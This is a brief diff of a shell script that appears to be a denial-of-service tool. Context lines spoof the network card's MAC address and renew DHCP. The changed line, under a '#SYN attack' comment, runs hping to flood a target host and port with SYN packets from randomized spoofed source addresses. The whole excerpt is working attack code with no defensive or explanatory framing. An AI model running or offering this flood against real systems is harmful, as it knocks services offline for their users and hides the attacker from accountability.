@@ -41,4 +41,4 @@ sudo macchanger -s $3 |grep Current
 sudo dhcpcd $3
 
 #SYN attack
-sudo hping -i u5 -S -p $2 $1 --rand-source --flood -I $3
+sudo hping -S -p $2 $1 --rand-source --flood -I $3
